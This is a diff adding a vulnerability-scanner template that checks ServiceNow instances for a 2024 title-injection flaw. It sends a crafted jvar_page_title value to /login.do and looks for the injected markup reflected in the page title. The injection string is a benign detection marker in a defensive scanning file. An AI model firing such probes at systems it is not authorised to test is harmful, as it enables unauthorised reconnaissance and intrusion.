@@ -1,0 +1,30 @@
+id: servicenow-title-injection
+brief:
+    title: Service Now - Title Injection
+    by: DhiyaneshDk
+    level: high
+    about: ""
+    label:
+        - cve
+        - cve2024
+        - servicenow
+        - injection
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/login.do?jvar_page_title=<style><foo>Injected Title</foo></style>'
+      signs:
+        - "on": word
+          has:
+            - <title><style><foo>Injected Title</foo></style></title>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
